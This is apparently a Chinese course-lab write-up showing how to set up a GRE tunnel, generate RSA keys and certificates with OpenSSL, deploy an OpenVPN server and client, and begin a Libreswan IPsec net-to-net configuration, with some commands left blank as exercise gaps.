<h3 id="【操作步骤】-4"><a href="#【操作步骤】-4" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.双击桌面Xshell5图标，在弹出的界面登陆主机192.168.1.11和192.168.2.11这两台主机.密码为Simplexue123：</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531163847691.png" alt="image-20200531163847691"></p>
<p>分别修改主机名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname vpn1</span><br><span class="line">hostnamectl set-hostname vpn2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164020447.png" alt="image-20200531164020447"></p>
<p>重新登陆两台主机后如下图：</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164125270.png" alt="image-20200531164125270"></p>
<p>2.vpn1和vpn2主机分别加载gre内核模块并检查</p>
<p>加载ip_gre内核模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe ip_gre</span><br></pre></td></tr></table></figure>

<p>查询ip_gre模块是否加载，如图所示已正常加载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsmod | grep gre</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164227760.png" alt="image-20200531164227760"></p>
<p>3.配置tunnel（GRE隧道）使它们互通</p>
<p>vpn1创建一个GRE类型隧道设备gre1, 并设置对端IP为192.168.2.11。隧道数据包将被从192.168.1.11也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.1，掩码为255.255.255.0。</p>
<p>3.1 创建GRE类型隧道设备gre1，并验证是否添加成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~] ip tunnel add gre1 mode gre remote 192.168.2.11 local 192.168.1.11 ttl 255</span><br><span class="line">[root@vpn1 ~] ip a | grep gre1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164636877.png" alt="image-20200531164636877"></p>
<p>3.2启动gre1并分配ip地址10.10.10.1，检测是否添加并启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link set gre1 up</span><br><span class="line">ip addr add 10.10.10.1/24 dev gre1</span><br><span class="line">ip a | grep gre1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164823039.png" alt="image-20200531164823039"></p>
<p>3.3 查看隧道状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip -d link show</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531164920738.png" alt="image-20200531164920738"></p>
<p>3.3 vpn2创建一个GRE类型隧道设备gre1, 并设置对端IP为192.168.1.11。隧道数据包将被从192.168.2.11也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.2，掩码为255.255.255.0。</p>
<p>操作步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip tunnel add gre1 mode gre remote 192.168.1.11 local 192.168.2.11 ttl 255</span><br><span class="line">ip link set gre1 up</span><br><span class="line">ip addr add 10.10.10.2/24 dev gre1</span><br><span class="line">ip a | grep gre1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531165426341.png" alt="image-20200531165426341"></p>
<p>3.4测试隧道是否通：</p>
<p>ping检测，是通的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping 10.10.10.2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531165525527.png" alt="image-20200531165525527"></p>
<p>4.卸载GRE模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> （） ip_gre</span></span><br><span class="line">rmmod ip_gre</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531170109839.png" alt="image-20200531170109839"></p>
<h2 id="任务二、使用加密工具OpenSSL创建加密密钥"><a href="#任务二、使用加密工具OpenSSL创建加密密钥" class="headerlink" title="任务二、使用加密工具OpenSSL创建加密密钥"></a>任务二、使用加密工具OpenSSL创建加密密钥</h2><h3 id="【任务描述】-5"><a href="#【任务描述】-5" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验主要是用来了解openssl 的使用及原理，通过本实验可以了解如何实现秘钥证书管理、对称加密和非对称加密。</p>
<h3 id="【实验目标】-5"><a href="#【实验目标】-5" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>1.了解openssl加密解密原理。<br>2.掌握openssl如何生成公钥私钥，以及公私钥之间的相互转化。<br>3.掌握如何用openssl生成带密码的公钥私钥，以及之间的加密解密。<br>4.掌握如何生成带签名信息的证书。</p>
<h3 id="【实验工具】-5"><a href="#【实验工具】-5" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>openssl</li>
</ul>
<h3 id="【操作步骤】-5"><a href="#【操作步骤】-5" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.查看openssl命令的基本帮助</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# openssl genrsa -</span><br><span class="line">//密钥位数，建议1024及以上</span><br><span class="line">usage: genrsa [args] [numbits]</span><br><span class="line">//生成的密钥使用des方式进行加密</span><br><span class="line"> -des            encrypt the generated key with DES in cbc mode</span><br><span class="line">//生成的密钥使用des3方式进行加密</span><br><span class="line"> -des3           encrypt the generated key with DES in ede cbc mode (168 bit key)</span><br><span class="line"> -idea           encrypt the generated key with IDEA in cbc mode</span><br><span class="line">//生成的密钥还是要seed方式进行</span><br><span class="line"> -seed           encrypt PEM output with cbc seed</span><br><span class="line">//生成的密钥使用aes方式进行加密</span><br><span class="line"> -aes128, -aes192, -aes256 encrypt PEM output with cbc aes</span><br><span class="line">//生成的密钥使用camellia方式进行加密</span><br><span class="line"> -camellia128, -camellia192, -camellia256</span><br><span class="line">                 encrypt PEM output with cbc camellia</span><br><span class="line">//生成的密钥文件，可从中提取公钥</span><br><span class="line"> -out file       output the key to 'file</span><br><span class="line">//指定密钥文件的加密口令，可从文件、环境变量、终端等输入</span><br><span class="line"> -passout arg    output file pass phrase source</span><br><span class="line">//选择指数e的值，默认指定该项，e值为65537</span><br><span class="line"> -f4             use F4 (0x10001) for the E value</span><br><span class="line">//选择指数e的值，默认值为65537，使用该选项则指数指定为3</span><br><span class="line"> -3              use 3 for the E value</span><br><span class="line">//指定三方加密库或者硬件</span><br><span class="line"> -engine e       use engine e, possibly a hardware device.</span><br><span class="line">//产生随机数的种子文件</span><br><span class="line"> -rand file:file:...</span><br><span class="line">                 load the file (or the files in the directory) into</span><br><span class="line">                 the random number generator</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531170554970.png" alt="image-20200531170554970"></p>
<p>2.生成私钥<br>2.1生产RSA私钥(无加密)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# openssl genrsa -out rsa_private.key 2048</span><br><span class="line">[root@vpn1 ~]# ll rsa_private.key</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531171210154.png" alt="image-20200531171210154"></p>
<p>2.2生成rsa_private.key私钥对应的公钥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# openssl rsa -in rsa_private.key -pubout -out rsa_public.key</span><br><span class="line">[root@vpn1 ~]# ll rsa_public.key</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531171520242.png" alt="image-20200531171520242"></p>
<p>3.生成RAS含密码（使用aes256加密）公私钥</p>
<p> 其中 <strong>passout 代替shell 进行密码输入</strong>，否则会提示输入密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# openssl genrsa -aes256 -passout pass:simple -out rsa__aes_private.key 2048</span><br></pre></td></tr></table></figure>
<p> 生成其对应的公钥，需要输入密码，其中 pass 代替shell 进行密码输入，否则会提示输入密码；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# openssl rsa -in rsa_aes_private.key -passin pass:simple -pubout -out rsa_ase_public.key</span><br><span class="line">[root@vpn1 ~]# ll rsa_*</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531173041882.png" alt="image-20200531173041882"></p>
<p>4.加密与非加密之间的转换</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">私钥转非加密</span></span><br><span class="line">openssl rsa -in rsa_aes_private.key -passin pass:simple -out rsa_private.key</span><br><span class="line"><span class="meta">#</span><span class="bash">私钥转加密</span></span><br><span class="line">openssl rsa -in rsa_private.key -aes256 -passout pass:simple -out rsa_aes_private.key</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531173259740.png" alt="image-20200531173259740">5.生成自签名证书</p>
<p> 生成 RSA 私钥和自签名证书<br> req是证书请求的子命令，-newkey rsa:2048 -keyout private_key.pem 表示<strong>生成私钥(PKCS8格式)</strong>，-nodes 表示私钥不加密，若不带参数将提示输入密码；-x509表示输出证书，-days365 为有效期，<strong>此后根据提示输入证书拥有者信息</strong>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout rsa_private.key -x509 -days 365 -out cert.crt</span><br></pre></td></tr></table></figure>
<p> 若执行自动输入，可使用-subj选项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout rsa_private.key -x509 -days 365 -out cert.crt -subj &amp;quot;/C=CN/ST=BJ/L=BJ/O=simpleedu/OU=edu/CN=simple/emailAddress=simple@simpleedu.com&amp;quot;</span><br></pre></td></tr></table></figure>
<p> 使用 已有RSA 私钥生成自签名证书<br> -new 指生成证书请求，加上-x509 表示直接输出证书，-key 指定私钥文件，其余选项与上述命令相同</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl req -new -x509 -days 365 -key rsa_private.key -out cert.crt</span><br></pre></td></tr></table></figure>
<p>根据提示输入相应的信息即可<br><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531173927842.png" alt="image-20200531173927842"></p>
<p>6.生成签名请求及CA 签名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用 RSA私钥生成 CSR 签名请求</span></span><br><span class="line">openssl （） -aes256 -passout pass:simpleedu -out server.key 2048</span><br><span class="line">openssl req -new -key server.key -out server.csr</span><br></pre></td></tr></table></figure>
<p>此时生成的 csr签名请求文件可提交至 CA进行签发</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531174017966.png" alt="image-20200531174017966"></p>
<h2 id="任务三、SSL-VPN之OpenVPN的安装配置"><a href="#任务三、SSL-VPN之OpenVPN的安装配置" class="headerlink" title="任务三、SSL VPN之OpenVPN的安装配置"></a>任务三、SSL VPN之OpenVPN的安装配置</h2><h3 id="【任务描述】-6"><a href="#【任务描述】-6" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在两台台服务器搭建的典型企业局域网环境中，主要完成以下内容：<br>（1）搭建openvpn服务端与客户端。<br>（2）实现客户端可访问服务端机器</p>
<h3 id="【实验目标】-6"><a href="#【实验目标】-6" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>1.了解企业级别openvpn的使用场景。<br>2.掌握企业级别openvpn搭建和使用。<br>3.掌握openvpn客户端与服务端的搭建配置。</p>
<h3 id="【实验工具】-6"><a href="#【实验工具】-6" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>openvpn</li>
</ul>
<h3 id="【操作步骤】-6"><a href="#【操作步骤】-6" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.在vpn1机器安装openvpn并验证</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# yum clean all</span><br><span class="line">[root@vpn1 ~]# yum install openvpn -y</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531174906049.png" alt="image-20200531174906049"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# rpm -qa | grep openvpn</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531180816894.png" alt="image-20200531180816894"></p>
<p>2.修改openvpn的配置文件server.conf配置文件的内容如下<br>2.1拷贝模板文件到配置文件目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# cp /usr/share/doc/openvpn-2.4.4/sample/sample-config-files/server.conf /etc/openvpn/</span><br><span class="line">[root@vpn1 ~]# ls /etc/openvpn/server.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531180948129.png" alt="image-20200531180948129"></p>
<p>2.2 修改openvpn服务端的配置文件 /etc/openvpn/server.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# vim /etc/openvpn/server.conf</span><br></pre></td></tr></table></figure>
<p>2.2.1 指定TCP协议(使用TCP协议如果连接上VPN后网络很慢，可以更改成使用UDP协议)</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181342120.png" alt="image-20200531181342120"></p>
<p>2.2.2打开这三行注释，配置DNS（实验环境无法连通外网，可不配置）</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181252238.png" alt="image-20200531181252238"></p>
<p>2.2.3 设置启动用户</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181222251.png" alt="image-20200531181222251"></p>
<p>2.2.4 注释掉 explicit-exit-notify 1</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181417689.png" alt="image-20200531181417689"></p>
<p>3.安装密钥生成软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# yum install easy-rsa -y</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181736958.png" alt="image-20200531181736958"></p>
<p>4.准备配置证书文件<br>4.1拷贝文件到/etc/openvpn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# cp -r /usr/share/easy-rsa/ /etc/openvpn/</span><br><span class="line">[root@vpn1 ~]# ls /etc/openvpn/easy-rsa/</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531181847294.png" alt="image-20200531181847294"></p>
<p>4.2配置生成证书的环境变量.并使之生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# vim /etc/openvpn/easy-rsa/2.0/vars</span><br></pre></td></tr></table></figure>
<p>  现只修改如下几条，可根据自己情况进行修改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export KEY_COUNTRY=&amp;quot;CN&amp;quot;</span><br><span class="line">export KEY_PROVINCE=&amp;quot;BJ&amp;quot;</span><br><span class="line">export KEY_CITY=&amp;quot;BEIJING&amp;quot;</span><br><span class="line">export KEY_ORG=&amp;quot;SimpleEdu&amp;quot;</span><br><span class="line">export KEY_EMAIL=&amp;quot;simpleedu@simple.com&amp;quot;</span><br><span class="line">export KEY_OU=&amp;quot;MyOrganizationalUnit&amp;quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531182101959.png" alt="image-20200531182101959"></p>
<p>使配置的环境变量生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# cd  /etc/openvpn/easy-rsa/2.0/</span><br><span class="line">[root@vpn1 2.0]# () vars</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531182447259.png" alt="image-20200531182447259"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531182518951.png" alt="image-20200531182518951"></p>
<p>4.3 根据提示先删除所有，再根据自己情况进行修改（默认回车即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 2.0]# cd /etc/openvpn/easy-rsa/2.0/</span><br><span class="line">[root@vpn1 2.0]# source vars</span><br><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/easy-rsa/2.0/keys</span><br><span class="line">[root@vpn1 2.0]# ./clean-all</span><br><span class="line">[root@vpn1 2.0]# ./build-ca</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531182621851.png" alt="image-20200531182621851"></p>
<p>5.建服务端的证书<br>创建通用名(common name)为”server”的证书文件,交互输入自己的值,回车键进行，在提示输入密码的地方，设置一个密码如simple123</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 2.0]# ./build-key-server server</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531182822476.png" alt="image-20200531182822476"></p>
<p>生成防攻击的key文件（防DDos攻击、UDP淹没等恶意攻击）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 2.0]# openvpn --genkey --secret keys/ta.key</span><br><span class="line">[root@vpn1 2.0]# ll keys/ta.key</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183208408.png" alt="image-20200531183208408"></p>
<p>6.建客户端证书<br>6.1.创建密钥文件，耗时间一分钟左右</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 2.0]# ./build-dh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183249605.png" alt="image-20200531183249605"></p>
<p>可以看到有一个dh2048.pem的文件产生</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183408596.png" alt="image-20200531183408596"></p>
<p>6.2拷贝密钥认证文件到配置文件目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 2.0]# cd /etc/openvpn/easy-rsa/2.0/keys/</span><br><span class="line">[root@vpn1 keys]# cp  dh2048.pem  ca.crt  server.crt  server.key  ta.key   /etc/openvpn</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183510864.png" alt="image-20200531183510864"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183654241.png" alt="image-20200531183654241"></p>
<p>6.3创建一个通用名(common name)为 client的客户端证书，交互输入自己的值,默认回车键进行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 keys]# cd ..</span><br><span class="line">[root@vpn1 2.0]# ./build-key client</span><br><span class="line">[root@vpn1 2.0]# ll keys/client.*</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531183841342.png" alt="image-20200531183841342"></p>
<p>7.启动并检查<br>7.1 启动openvpn服务并设置为哦开机自启动</p>
<p>  启动openvpn服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl start openvpn@server.service</span><br></pre></td></tr></table></figure>
<p>  设置开机自启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl (  ) openvpn@server.service</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531184241385.png" alt="image-20200531184241385"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531184327092.png" alt="image-20200531184327092"></p>
<p>查看状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl status openvpn@server.service</span><br></pre></td></tr></table></figure>
<p>  <img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531184427709.png" alt="image-20200531184427709"></p>
<p>检查是否启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# netstat -lntup | grep openvpn</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531184504061.png" alt="image-20200531184504061"></p>
<p>  如下所示表示正常启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcp        0      0 0.0.0.0:1194            0.0.0.0:*               LISTEN      8870/openvpn</span><br></pre></td></tr></table></figure>

<p>8.客户端（vpn2）登录测试<br>8.1 在客户端安装openvpn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# yum install openvpn -y</span><br></pre></td></tr></table></figure>
<p>8.2 在vpn1端把生产文件拷贝到客户端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 keys]# cd /etc/openvpn/easy-rsa/2.0/keys/</span><br></pre></td></tr></table></figure>
<p>  密码为Simplexue123</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 keys]# scp ca.crt client.crt client.key ta.key 192.168.2.11:/etc/openvpn/client/</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531184806266.png" alt="image-20200531184806266"></p>
<p>8.3 编辑客户端配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]#vim /etc/openvpn/client/client.conf</span><br><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto tcp</span><br><span class="line">remote 192.168.1.11 1194</span><br><span class="line">resolv-retry infinite</span><br><span class="line">nobind</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">ca /etc/openvpn/client/ca.crt</span><br><span class="line">cert /etc/openvpn/client/client.crt</span><br><span class="line">key /etc/openvpn/client/client.key</span><br><span class="line">tls-auth /etc/openvpn/client/ta.key 1</span><br><span class="line">cipher AES-256-CBC</span><br><span class="line">verb 3</span><br><span class="line">mute 20</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531185156994.png" alt="image-20200531185156994"></p>
<p>8.4 启动openvpn客户端并挂后台运行，并可实时查看其日志。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 client]# cd /etc/openvpn/client/</span><br><span class="line">[root@vpn2 client]# openvpn /etc/openvpn/client/client.conf  &amp;amp;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531185341468.png" alt="image-20200531185341468"></p>
<p>8.5 查看网卡信息，得知已获取到ip 8.6 测试是否可使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# ip addr show tun0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 client]# ping 10.8.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531190343338.png" alt="image-20200531190343338"></p>
<p>8.7 openvpn nat配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# iptables -t nat -A POSTROUTING -s 10.8.0.1/24 -j MASQUERADE</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531190513066.png" alt="image-20200531190513066"></p>
<p>在vpn2上测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn2 ~]# ping -c 1 www.baidu.com</span><br></pre></td></tr></table></figure>

<p>注：实验环境不能外网， 访问百度只是为了验证策略<br>vpn1上验证策略</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531190608366.png" alt="image-20200531190608366"></p>
<p>8.8 关闭服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# pkill openvpn</span><br><span class="line">[root@vpn2 ~]# pkill openvpn</span><br></pre></td></tr></table></figure>


<h2 id="任务四、IPsecVPN原理及安装配置"><a href="#任务四、IPsecVPN原理及安装配置" class="headerlink" title="任务四、IPsecVPN原理及安装配置"></a>任务四、IPsecVPN原理及安装配置</h2><h3 id="【任务描述】-7"><a href="#【任务描述】-7" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在两台台服务器搭建的典型企业局域网环境中，主要完成以下内容：<br>（1）搭建ipsec服务端与客户端。<br>（2）实现客户端可访问服务端机器</p>
<h3 id="【实验目标】-7"><a href="#【实验目标】-7" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><p>1.了解企业级别ipsec的使用场景。<br>2.掌握企业级别ipsec搭建和使用。<br>3.掌握ipsec客户端与服务端的搭建配置。<br>4.掌握ipsec多种验证方式的实现</p>
<h3 id="【实验工具】-7"><a href="#【实验工具】-7" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>ipsec</li>
<li>openssl</li>
</ul>
<h3 id="【操作步骤】-7"><a href="#【操作步骤】-7" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>1.调整内核参数，开启数据转发，关闭icmp重定向并使之生效。（VPN1和VPN2机器都要做）</p>
<p>将下面配置文件加入/etc/sysctl.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# vim  &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">net.ipv4.ip_forward &#x3D; 1</span><br><span class="line">net.ipv4.conf.default.rp_filter &#x3D; 0</span><br><span class="line">net.ipv4.conf.all.accept_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.all.send_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.default.accept_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.default.send_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth0.accept_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth0.send_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth1.accept_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth1.send_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.lo.accept_redirects &#x3D; 0</span><br><span class="line">net.ipv4.conf.lo.send_redirects &#x3D; 0</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192211688.png" alt="image-20200531192211688"></p>
<p>使配置生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# （）</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192258434.png" alt="image-20200531192258434"></p>
<p>在VPN2上也做以上操作</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192855380.png" alt="image-20200531192855380"></p>
<p>2.安装openswan、libreswan并验证安装。（VPN1和VPN2机器都要做）<br>2.1安装并验证，两台机器都做</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# yum install openswan libreswan  -y</span><br><span class="line">[root@vpn1 ~]# ipsec --version</span><br><span class="line">Linux Libreswan U3.20/K(no kernel code presently loaded) on 3.10.0-693.5.2.el7.x86_64</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192655413.png" alt="image-20200531192655413"></p>
<p>2.2 启动服务看是否正常，显示如图测正常，若不是请检查内核配置文件，两台机器都验证。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# systemctl start ipsec.service</span><br><span class="line">[root@vpn1 ~]# ipsec verify</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192931454.png" alt="image-20200531192931454"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vpn1 ~]# netstat -lntup | grep pluto</span><br></pre></td></tr></table></figure>
<p>openswan监听在UDP的500和4500两个端口，其中500是用来IKE密钥交换协商，4500的NAT-T是nat穿透的</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531192945005.png" alt="image-20200531192945005"></p>
<p>3.配置ipsecVPN配置（模式为network-to-network），下面介绍两种认证方式</p>
<p>3.1基于pre-shared keys认证方式（PSK）</p>
<p>配置/etc/ipsec.conf配置文件末尾增加如下（VPN1和VPN2的配置问件相同）</p>
<pre><code>conn net-to-net
ike=aes256-sha2_256;modp2048
    phase2alg=aes256-sha2_256;modp2048
    #使用预共享密钥方式进行认证
    authby=secret
    type=tunnel
    # 一端IP地址
    left=192.168.1.11
    #一端内网网段地址
    leftsubnet=10.0.0.0/24
    #一端的标识符，可以任意填写，如果多个连接需要区分
    leftid=@vpn1
    leftnexthop=%defaultroute
    right=192.168.2.11
    rightsubnet=10.0.1.0/24
    rightid=@vpn2
    rightnexthop=%defaultroute
